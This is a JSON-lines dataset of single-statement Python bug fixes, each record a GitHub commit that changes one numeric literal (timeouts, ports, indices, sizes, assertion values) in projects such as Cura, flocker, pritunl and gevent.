{"project": "Cura", "commit_sha": "5873f1d4d09206261f27bb12c6527a7fa9aeb123", "parent_sha": "49e5b1938a8a367d4d47ca04dc877e065982a940", "file_path": "plugins/CuraEngineBackend/ProcessSlicedLayersJob.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ class ProcessSlicedLayersJob(Job):\n                 Job.yieldThread()\n             Job.yieldThread()\n             current_layer += 1\n-            progress = (current_layer / layer_count) * 100\n+            progress = (current_layer / layer_count) * 99\n             # TODO: Rebuild the layer data mesh once the layer has been processed.\n             # This needs some work in LayerData so we can add the new layers instead of recreating the entire mesh.\n \n", "before": "progress = ( current_layer / layer_count ) * 100", "after": "progress = ( current_layer / layer_count ) * 99", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:100\", 3, 56, 3, 59], \"99\"]]"}
{"project": "pydbus", "commit_sha": "c64149d3b1bb4998bddd6c05c85f0b3129f47020", "parent_sha": "f0c62be99cd5c3b74828279ccd32249c2bc43db8", "file_path": "pydbus/bus.py", "project_url": "https://github.com/acaso/pydbus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ from .publication import PublicationMixin\n class Bus(ProxyMixin, OwnMixin, WatchMixin, SubscriptionMixin, RegistrationMixin, PublicationMixin):\n \tType = Gio.BusType\n \n-\tdef __init__(self, type, timeout=10):\n+\tdef __init__(self, type, timeout=1000):\n \t\tself.con = Gio.bus_get_sync(type, None)\n \t\tself.timeout = timeout\n \n", "before": "def __init__ ( self , type , timeout = 10 ) : self . con = Gio . bus_get_sync ( type , None ) self . timeout = timeout", "after": "def __init__ ( self , type , timeout = 1000 ) : self . con = Gio . bus_get_sync ( type , None ) self . timeout = timeout", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:10\", 3, 35, 3, 37], \"1000\"]]"}
{"project": "Cura", "commit_sha": "1e2147522deab8e4d64e4422dc1095731c8afe61", "parent_sha": "32c5c1ad7a3f2ed46b2114beabf67a3c18d5ac65", "file_path": "plugins/CuraEngineBackend/CuraEngineBackend.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class CuraEngineBackend(Backend):\n         self._always_restart = True #Always restart the engine when starting a new slice. Don't keep the process running. TODO: Fix engine statelessness.\n         self._process_layers_job = None #The currently active job to process layers, or None if it is not processing layers.\n \n-        self._backend_log_max_lines = 200 # Maximal count of lines to buffer\n+        self._backend_log_max_lines = 20000 # Maximum number of lines to buffer\n         self._error_message = None #Pop-up message that shows errors.\n \n         self.backendQuit.connect(self._onBackendQuit)\n", "before": "self . _backend_log_max_lines = 200", "after": "self . _backend_log_max_lines = 20000", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:200\", 3, 39, 3, 42], \"20000\"]]"}
{"project": "OpenTidalFarm", "commit_sha": "fd27dead5c93883ea4d9097d62c5062064451aaf", "parent_sha": "b674c1c1fba5623c2f96391e744229f737d3d300", "file_path": "tests/optimal_friction_mini_model/test_friction_optimisation.py", "project_url": "https://github.com/baba-mpe/OpenTidalFarm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ class TestFrictionOptimisation(object):\n \n         p = numpy.random.rand(len(m0))\n         minconv = helpers.test_gradient_array(rf.evaluate, rf.derivative, m0,\n-                                              seed=0.001,\n+                                              seed=0.004,\n                                               perturbation_direction=p)\n         assert minconv > 1.96\n \n", "before": "minconv = helpers . test_gradient_array ( rf . evaluate , rf . derivative , m0 , seed = 0.001 , perturbation_direction = p )", "after": "minconv = helpers . test_gradient_array ( rf . evaluate , rf . derivative , m0 , seed = 0.004 , perturbation_direction = p )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:0.001\", 3, 52, 3, 57], \"0.004\"]]"}
{"project": "OpenTidalFarm", "commit_sha": "b1ea4c3cd5c9809a7a36a95ef57810af9863ca38", "parent_sha": "82c75f9032c9a8d0c6ded92cc38529fbc9773566", "file_path": "tests/checkpoint/sw.py", "project_url": "https://github.com/baba-mpe/OpenTidalFarm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ set_log_level(PROGRESS)\n \n def default_config():\n   config = configuration.DefaultConfiguration(nx=20, ny=10, finite_element = finite_elements.p1dgp2)\n-  config.set_domain(opentidalfarm.domains.RectangularDomain(3000, 1000, 20, 3))\n+  config.set_domain(opentidalfarm.domains.RectangularDomain(3000, 1000, 20, 10))\n   config.params[\"verbose\"] = 0\n \n   # dt is used in the functional only, so we set it here to 1.0\n", "before": "config . set_domain ( opentidalfarm . domains . RectangularDomain ( 3000 , 1000 , 20 , 3 ) )", "after": "config . set_domain ( opentidalfarm . domains . RectangularDomain ( 3000 , 1000 , 20 , 10 ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 77, 3, 78], \"10\"]]"}
{"project": "flocker", "commit_sha": "4dd09c8137398b99a1d802c8a240c82fde9d0cd3", "parent_sha": "8c649d40e49fc640d5454c7005ac6985c2964168", "file_path": "flocker/node/test/test_script.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -262,7 +262,7 @@ class AgentServiceFactoryTests(SynchronousTestCase):\n                 reactor=reactor,\n                 deployer=deployer,\n                 host=b\"10.0.0.2\",\n-                port=1234,\n+                port=4524,\n                 context_factory=_context_factory(self.config.parent(),\n                                                  b\"10.0.0.2\", 1234),\n             ),\n", "before": "port = 1234 ,", "after": "port = 4524 ,", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1234\", 3, 22, 3, 26], \"4524\"]]"}
{"project": "flocker", "commit_sha": "df598e3dbeb65a6f1f17e4798b4de4e115e38437", "parent_sha": "4dd09c8137398b99a1d802c8a240c82fde9d0cd3", "file_path": "flocker/node/test/test_script.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -264,7 +264,7 @@ class AgentServiceFactoryTests(SynchronousTestCase):\n                 host=b\"10.0.0.2\",\n                 port=4524,\n                 context_factory=_context_factory(self.config.parent(),\n-                                                 b\"10.0.0.2\", 1234),\n+                                                 b\"10.0.0.2\", 4524),\n             ),\n             service_factory.get_service(reactor, options)\n         )\n", "before": "context_factory = _context_factory ( self . config . parent ( ) , b\"10.0.0.2\" , 1234 ) ,", "after": "context_factory = _context_factory ( self . config . parent ( ) , b\"10.0.0.2\" , 4524 ) ,", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1234\", 3, 63, 3, 67], \"4524\"]]"}
{"project": "flocker", "commit_sha": "9332dda27758b88016270ea0b13970f115aa9a61", "parent_sha": "bca3c22f8115d1787dd93ec68d7ce9a3c084ce1c", "file_path": "flocker/node/_loop.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -277,7 +277,7 @@ _UNCONVERGED_DELAY = 0.1\n class UnconvergedDelay(object):\n     def __init__(self,\n                  initial_sleep=_UNCONVERGED_DELAY,\n-                 max_sleep=400,\n+                 max_sleep=10,\n                  min_sleep=_UNCONVERGED_DELAY):\n         self.delay = initial_sleep\n         self.max_sleep = max_sleep\n", "before": "def __init__ ( self , initial_sleep = _UNCONVERGED_DELAY , max_sleep = 400 , min_sleep = _UNCONVERGED_DELAY ) : self . delay = initial_sleep self . max_sleep = max_sleep", "after": "def __init__ ( self , initial_sleep = _UNCONVERGED_DELAY , max_sleep = 10 , min_sleep = _UNCONVERGED_DELAY ) : self . delay = initial_sleep self . max_sleep = max_sleep", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:400\", 3, 28, 3, 31], \"10\"]]"}
{"project": "flocker", "commit_sha": "d40a897341ece2b1eafe93673591b42cdb9d54ec", "parent_sha": "e6f48725d024f87b1cb36c8f062abe4fa85161d2", "file_path": "flocker/provision/_gce.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -463,7 +463,7 @@ class GCEInstanceBuilder(PClass):\n         ).execute()\n \n         operation_result = wait_for_operation(\n-            self.compute, operation, timeout_steps=[1]*60)\n+            self.compute, operation, timeout_steps=[5]*60)\n \n         if not operation_result:\n             raise ValueError(\n", "before": "operation_result = wait_for_operation ( self . compute , operation , timeout_steps = [ 1 ] * 60 )", "after": "operation_result = wait_for_operation ( self . compute , operation , timeout_steps = [ 5 ] * 60 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 53, 3, 54], \"5\"]]"}
{"project": "morpion_aveugle_EA", "commit_sha": "9e30f2b594cbf83897cdf9912fae11dd0f9e2fb8", "parent_sha": "51aa206997be796f4b026db3710f66e656a7f615", "file_path": "main_reseau.py", "project_url": "https://github.com/Apodeus/morpion_aveugle_EA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -411,7 +411,7 @@ def main_client(ip, port):\n \n def main():\n \targv = sys.argv\n-\tif len(argv) == 0:\n+\tif len(argv) == 1:\n \t\tmain_server()\n \telse:\n \t\tip = sys.argv[1]\n", "before": "if len ( argv ) == 0 : main_server ( ) else : ip = sys . argv [ 1 ]", "after": "if len ( argv ) == 1 : main_server ( ) else : ip = sys . argv [ 1 ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 18, 3, 19], \"1\"]]"}
{"project": "LanguageSelector", "commit_sha": "5ba41c64ad6bc9192dff18127abe3bcc38006eb3", "parent_sha": "6f52cc9d69fe4d2248720822ab9cfe00a74c2d26", "file_path": "language-selector.py", "project_url": "https://github.com/FluidIdeas/LanguageSelector", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class MainFrame(wx.Frame):\n         self.GetSizer().Add(wx.StaticLine(self, -1), (2, 0), (1, 1), wx.EXPAND | wx.ALL, 2)\n         self.GetSizer().Add(self.Ok, (3, 0), (1, 1), wx.ALL | wx.ALIGN_RIGHT, 5)\n         self.Bind(wx.EVT_BUTTON, self.OnClick)\n-        self.SetSize((350, 110))\n+        self.SetSize((350, 145))\n         self.GetSizer().AddGrowableCol(0)\n         self.InitLanguages()\n         self.Center()\n", "before": "self . SetSize ( ( 350 , 110 ) )", "after": "self . SetSize ( ( 350 , 145 ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:110\", 3, 28, 3, 31], \"145\"]]"}
{"project": "soy", "commit_sha": "697b9030893a6c9b7769e7a091e9e8d3f0ad788b", "parent_sha": "5b845d85a2e5574ff074b3898f6c1880cb297b2f", "file_path": "soy/nlp/extractors/_word.py", "project_url": "https://github.com/summatic/soy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ from soy.utils._utils import IntegerEncoder\n \n class CohesionProbability:\n     \n-    def __init__(self, left_min_length=2, left_max_length=7, right_min_length=1, right_max_length=6):\n+    def __init__(self, left_min_length=2, left_max_length=10, right_min_length=1, right_max_length=6):\n         \n         self.left_min_length = left_min_length\n         self.left_max_length = left_max_length\n", "before": "def __init__ ( self , left_min_length = 2 , left_max_length = 7 , right_min_length = 1 , right_max_length = 6 ) : self . left_min_length = left_min_length self . left_max_length = left_max_length", "after": "def __init__ ( self , left_min_length = 2 , left_max_length = 10 , right_min_length = 1 , right_max_length = 6 ) : self . left_min_length = left_min_length self . left_max_length = left_max_length", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:7\", 3, 59, 3, 60], \"10\"]]"}
{"project": "django-localeurl", "commit_sha": "2fe0f1d0077684e112efd0c22b46f52e17cdbd43", "parent_sha": "865f8d3e6f2df374af9c6e34a2be02ea24491b85", "file_path": "localeurl/tests/tests.py", "project_url": "https://github.com/gonnado/django-localeurl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -206,7 +206,7 @@ class MiddlewareTestCase(LocaleurlTestCase):\n \n \n     def test_redirect_statuscode_not_supported(self):\n-        self.settings_manager.set(LOCALE_REDIRECT_CODE=408)\n+        self.settings_manager.set(LOCALE_REDIRECT_CODE=418)\n         reload(localeurl_settings)\n \n         r1 = self.request_factory.get('/nl-be/test/independent/?foo=bar')\n", "before": "self . settings_manager . set ( LOCALE_REDIRECT_CODE = 408 )", "after": "self . settings_manager . set ( LOCALE_REDIRECT_CODE = 418 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:408\", 3, 56, 3, 59], \"418\"]]"}
{"project": "curator", "commit_sha": "c71851a3bd65149397d11a38e878b1df04f24740", "parent_sha": "caa0bef130a37f722638bacd0b12399ef124a5f1", "file_path": "test_curator/test_curator.py", "project_url": "https://github.com/mgmonteleone/curator", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class TestExpireIndices(TestCase):\n             'prefix-2013.01.03': True,\n             'prefix-2013.01.03.10': True,\n         }\n-        expired = curator.find_expired_indices(client, 'days', 3, prefix='prefix-', utc_now=datetime(2014, 1, 3))\n+        expired = curator.find_expired_indices(client, 'days', 4, prefix='prefix-', utc_now=datetime(2014, 1, 3))\n         \n         expired = list(expired)\n \n", "before": "expired = curator . find_expired_indices ( client , 'days' , 3 , prefix = 'prefix-' , utc_now = datetime ( 2014 , 1 , 3 ) )", "after": "expired = curator . find_expired_indices ( client , 'days' , 4 , prefix = 'prefix-' , utc_now = datetime ( 2014 , 1 , 3 ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 64, 3, 65], \"4\"]]"}
{"project": "pytrader", "commit_sha": "e81f004a16d80ccc6f9b9f0f546cb74037892eca", "parent_sha": "0b37939756b0ca622d6b7509c1306066dac1fd8d", "file_path": "goxapi.py", "project_url": "https://github.com/caktux/pytrader", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -888,7 +888,7 @@ class WebsocketClient(BaseClient):\n         reconnect_time = 1\n         use_ssl = self.config.get_bool(\"gox\", \"use_ssl\")\n         wsp = {True: \"wss://\", False: \"ws://\"}[use_ssl]\n-        port = {True: 442, False: 80}[use_ssl]\n+        port = {True: 443, False: 80}[use_ssl]\n         ws_origin = \"%s:%d\" % (self.WEBSOCKET_HOST, port)\n         ws_headers = [\"User-Agent: %s\" % USER_AGENT]\n         while not self._terminating:  #loop 0 (connect, reconnect)\n", "before": "port = { True : 442 , False : 80 } [ use_ssl ]", "after": "port = { True : 443 , False : 80 } [ use_ssl ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:442\", 3, 23, 3, 26], \"443\"]]"}
{"project": "spotpy", "commit_sha": "bb714c1fcab581a029246291ae841e7af63ac95c", "parent_sha": "02467c91752996ff838168301e5d54c7e5b8b14b", "file_path": "spotpy/database.py", "project_url": "https://github.com/zutn/spotpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -170,7 +170,7 @@ class csv(database):\n \n     def getdata(self, dbname=None):\n         data = np.genfromtxt(\n-            self.dbname + '.csv', delimiter=',', names=True)[1:]\n+            self.dbname + '.csv', delimiter=',', names=True)[0:]\n         return data\n \n class sql(database):\n", "before": "data = np . genfromtxt ( self . dbname + '.csv' , delimiter = ',' , names = True ) [ 1 : ]", "after": "data = np . genfromtxt ( self . dbname + '.csv' , delimiter = ',' , names = True ) [ 0 : ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 62, 3, 63], \"0\"]]"}
{"project": "kitsune", "commit_sha": "f32e117954bb7390de5412a62fbba48857dcf32d", "parent_sha": "a8c8bdad52820e20a7dbbc94f9cd56467af86b80", "file_path": "apps/wiki/views.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ def document(request, document_slug, template=None):\n         except Document.DoesNotExist:\n             pass\n \n-    related = doc.related_documents[:5]\n+    related = doc.related_documents[:3]\n \n     contributors = doc.contributors.all()\n \n", "before": "related = doc . related_documents [ : 5 ]", "after": "related = doc . related_documents [ : 3 ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:5\", 3, 38, 3, 39], \"3\"]]"}
{"project": "kitsune", "commit_sha": "04060049f68cfc2a4ac2066298d98032b6bcfec7", "parent_sha": "400343f2663d8eed69e3302bbb161c9437202307", "file_path": "apps/products/tests/test_templates.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ class ProductViewsTestCase(ElasticTestCase):\n         r = self.client.get(url, follow=True)\n         eq_(200, r.status_code)\n         doc = pq(r.content)\n-        eq_(10, len(doc('#help-topics li')))\n+        eq_(11, len(doc('#help-topics li')))\n \n     @mock.patch.object(waffle, 'flag_is_active')\n     def test_document_listing(self, flag_is_active):\n", "before": "eq_ ( 10 , len ( doc ( '#help-topics li' ) ) )", "after": "eq_ ( 11 , len ( doc ( '#help-topics li' ) ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:10\", 3, 13, 3, 15], \"11\"]]"}
{"project": "reverse", "commit_sha": "4b839fe5d7314c772c4b91af45c9ce9ae16250f9", "parent_sha": "cb7c664e9851dbb7aceb72fface70ae915f94164", "file_path": "lib/arch/x86/output.py", "project_url": "https://github.com/d4nnyk/reverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -311,7 +311,7 @@ class Output(OutputAbs):\n                 elif len(i.operands) == 2:\n                     self.print_operand(i, 0)\n                     print_no_end(\" \" + inst_symbol(i) + \" \")\n-                    self.print_operand(i, 2)\n+                    self.print_operand(i, 1)\n                 elif len(i.operands) == 1:\n                     sz = i.operands[0].size\n                     if sz == 1:\n", "before": "self . print_operand ( i , 2 )", "after": "self . print_operand ( i , 1 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 43, 3, 44], \"1\"]]"}
{"project": "telnet-iot-honeypot", "commit_sha": "592d245f526e519afd3e46ca8e3b251ee2edbdd1", "parent_sha": "ed32f8f905c07bb126b2d3990d54a34ef6f1a86a", "file_path": "honeypot/grammar/shell.py", "project_url": "https://github.com/Phype/telnet-iot-honeypot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -445,7 +445,7 @@ class Actions(object):\n                 cmd.redirect_to = r[1]\n                 cmd.redirect_append = True\n             if r[0] == \"<\":\n-                cmd.redirect_from = r[2]\n+                cmd.redirect_from = r[1]\n         \n         return cmd \n \n", "before": "cmd . redirect_from = r [ 2 ]", "after": "cmd . redirect_from = r [ 1 ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 39, 3, 40], \"1\"]]"}
{"project": "gevent", "commit_sha": "843a3b8923a58e081f599b9b1ea556c332578ac8", "parent_sha": "dc26b93b9a1e1216187eb57ba583dc2fda47e221", "file_path": "src/gevent/tests/test__greenlet.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -610,7 +610,7 @@ class TestBasic(greentest.TestCase):\n         import sys\n         limit = sys.getrecursionlimit()\n         self.addCleanup(sys.setrecursionlimit, limit)\n-        sys.setrecursionlimit(limit // 2)\n+        sys.setrecursionlimit(limit // 3)\n         def recur():\n             recur() # This is expected to raise RecursionError\n \n", "before": "sys . setrecursionlimit ( limit // 2 )", "after": "sys . setrecursionlimit ( limit // 3 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 40, 3, 41], \"3\"]]"}
{"project": "gevent", "commit_sha": "fbcafa4fa88d7377d21e2d1e3558335921ab28d3", "parent_sha": "843a3b8923a58e081f599b9b1ea556c332578ac8", "file_path": "src/gevent/tests/test__greenlet.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -610,7 +610,7 @@ class TestBasic(greentest.TestCase):\n         import sys\n         limit = sys.getrecursionlimit()\n         self.addCleanup(sys.setrecursionlimit, limit)\n-        sys.setrecursionlimit(limit // 3)\n+        sys.setrecursionlimit(limit // 4)\n         def recur():\n             recur() # This is expected to raise RecursionError\n \n", "before": "sys . setrecursionlimit ( limit // 3 )", "after": "sys . setrecursionlimit ( limit // 4 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 40, 3, 41], \"4\"]]"}
{"project": "pritunl", "commit_sha": "1680725acf8a513065a1d2ba48b39adac220fffa", "parent_sha": "33d19f017709da10aac5a17a61e3d5513481c8ba", "file_path": "pritunl/subscription.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ def update():\n                         'license': license,\n                         'version': settings.local.version_int,\n                     },\n-                    timeout=max(settings.app.http_request_timeout, 15))\n+                    timeout=max(settings.app.http_request_timeout, 10))\n \n                 # License key invalid\n                 if response.status_code == 470:\n", "before": "timeout = max ( settings . app . http_request_timeout , 15 )", "after": "timeout = max ( settings . app . http_request_timeout , 10 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:15\", 3, 68, 3, 70], \"10\"]]"}
{"project": "pritunl", "commit_sha": "0e9625deebc8dcb3d777128d6a98b39723eef77c", "parent_sha": "cb1a7c0a1974a93234548e51c3b01f520b941d57", "file_path": "pritunl/setup/server.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -194,7 +194,7 @@ def setup_server():\n         exit(75)\n \n     # Fix for replaced conf file in 0.10.x upgrade\n-    if db_ver_int < 100000000 and not settings.conf.mongodb_uri:\n+    if db_ver_int < 10000000000004000 and not settings.conf.mongodb_uri:\n         settings.conf.mongodb_uri = 'mongodb://localhost:27017/pritunl'\n         settings.conf.commit()\n \n", "before": "if db_ver_int < 100000000 and not settings . conf . mongodb_uri : settings . conf . mongodb_uri = 'mongodb://localhost:27017/pritunl' settings . conf . commit ( )", "after": "if db_ver_int < 10000000000004000 and not settings . conf . mongodb_uri : settings . conf . mongodb_uri = 'mongodb://localhost:27017/pritunl' settings . conf . commit ( )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:100000000\", 3, 21, 3, 30], \"10000000000004000\"]]"}
{"project": "pritunl", "commit_sha": "7f15a46a88567396eea1189ffb9c93705f7f091c", "parent_sha": "20be8c392672be78ff89af70989ef6ff6badf23a", "file_path": "pritunl/handlers/server.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -322,7 +322,7 @@ def server_put_post(server_id=None):\n         if max_clients:\n             max_clients = int(max_clients)\n         if not max_clients:\n-            max_clients = 2048\n+            max_clients = 1024\n \n     replica_count = None\n     replica_count_def = False\n", "before": "max_clients = 2048", "after": "max_clients = 1024", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2048\", 3, 27, 3, 31], \"1024\"]]"}
{"project": "pritunl", "commit_sha": "7bd4d62d65f331f76974bf09ae46248737add0c8", "parent_sha": "83daab3b8834f35d8cfcd6e8bf7c023a1ce1e107", "file_path": "pritunl/handlers/ping.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,6 +14,6 @@ def ping_get():\n     host_ttl = datetime.timedelta(seconds=settings.app.host_ttl)\n \n     if ping_timestamp and utils.now() > ping_timestamp + host_ttl:\n-        raise flask.abort(500)\n+        raise flask.abort(504)\n     else:\n         return utils.response()\n", "before": "raise flask . abort ( 500 )", "after": "raise flask . abort ( 504 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:500\", 3, 27, 3, 30], \"504\"]]"}
{"project": "lektor", "commit_sha": "708b9d8c71d36388557390f0bb568854adccb714", "parent_sha": "f6741b15807662a123c06301e753b03b99e42b09", "file_path": "tests/test_images.py", "project_url": "https://github.com/lektor/lektor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,4 +72,4 @@ def test_thumbnail_quality(builder):\n     # See if the image file with said quality suffix exists\n     assert os.path.isfile(image_file)\n     # And the filesize is less than 9000 bytes\n-    assert image_size < 9000\n+    assert image_size < 9200\n", "before": "assert image_size < 9000", "after": "assert image_size < 9200", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:9000\", 3, 25, 3, 29], \"9200\"]]"}
{"project": "openstates", "commit_sha": "03d4a3a64236f2880829a2446f2308bc1cb0251d", "parent_sha": "c56ae22d5e3a5d989d4ac3929b5f595026a35781", "file_path": "fiftystates/scrape/wa/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ class WABillScraper(BillScraper):\n     \n     \n     def scrape(self, chamber, year):\n-        if (year < 2005):\n+        if (year < 2001):\n             raise NoDataForYear(year)\n \n         self.scrape_year(year, chamber)\n\\ No newline at end of file\n", "before": "if ( year < 2005 ) : raise NoDataForYear ( year )", "after": "if ( year < 2001 ) : raise NoDataForYear ( year )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2005\", 3, 20, 3, 24], \"2001\"]]"}
{"project": "openstates", "commit_sha": "1abe79ff806e54c1051f0e8e7bb278f2c177214d", "parent_sha": "911c6fd811110f404ac220f9dc50439b314f725f", "file_path": "fiftystates/backend/utils.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ def insert_with_id(obj):\n \n \n def timestamp_to_dt(timestamp):\n-    return datetime.datetime(*time.localtime(timestamp)[0:7])\n+    return datetime.datetime(*time.localtime(timestamp)[0:6])\n \n \n def update(old, new, coll):\n", "before": "return datetime . datetime ( * time . localtime ( timestamp ) [ 0 : 7 ] )", "after": "return datetime . datetime ( * time . localtime ( timestamp ) [ 0 : 6 ] )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:7\", 3, 59, 3, 60], \"6\"]]"}
{"project": "openstates", "commit_sha": "402e57bde8db3024870f2c04d8faacbf4ac94c93", "parent_sha": "ba97d21611ef7afaf9b9019c919e3496f383fe01", "file_path": "scripts/ga/get_legislation.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class GALegislationScraper(LegislationScraper):\n                     scraper( url, year, chamberName, session, number )\n                 except IOError:\n                     break\n-                number += 100\n+                number += 1\n     \n     def scrape1995(self, url, year, chamberName, session, number):\n         \"e.g. http://www.legis.ga.gov/legis/1995_96/leg/sum/sb1.htm\"\n", "before": "number += 100", "after": "number += 1", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:100\", 3, 27, 3, 30], \"1\"]]"}
{"project": "pjpersist", "commit_sha": "7e45b547a70f1b7f475e50871c781a246362ab11", "parent_sha": "fc418ba9c1f00b7781d721285bf0ed47140dc2d9", "file_path": "src/pjpersist/tests/test_datamanager.py", "project_url": "https://github.com/Shoobx/pjpersist", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1414,7 +1414,7 @@ class DatamanagerConflictTest(testing.PJTestCase):\n         # verify by length that we have the full traceback\n         ctb = datamanager.CONFLICT_TRACEBACK_INFO.traceback\n         self.assertIsNotNone(ctb)\n-        self.assertEquals(len(ctb), 2)\n+        self.assertEquals(len(ctb), 17)\n         transaction.abort()\n \n         # start another transaction and verify the traceback\n", "before": "self . assertEquals ( len ( ctb ) , 2 )", "after": "self . assertEquals ( len ( ctb ) , 17 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 37, 3, 38], \"17\"]]"}
{"project": "openobject-client-6.0", "commit_sha": "a5ce598b3c7ad4af8d47d5f9c53f637471d8dfad", "parent_sha": "71237a76287f72c0d2a67354f7c833634be0a82a", "file_path": "bin/modules/action/wizard.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class dialog(object):\n \t\tself.screen.current_model.set(val)\n \n \t\tx,y = self.screen.screen_container.size_get()\n-\t\tself.screen.widget.set_size_request(x + 20, min(750, y+25))\n+\t\tself.screen.widget.set_size_request(x + 20, min(400, y+25))\n \n \t\tself.dia.vbox.pack_start(self.screen.widget)\n \t\tself.dia.set_title(self.screen.current_view.title)\n", "before": "self . screen . widget . set_size_request ( x + 20 , min ( 750 , y + 25 ) )", "after": "self . screen . widget . set_size_request ( x + 20 , min ( 400 , y + 25 ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:750\", 3, 51, 3, 54], \"400\"]]"}
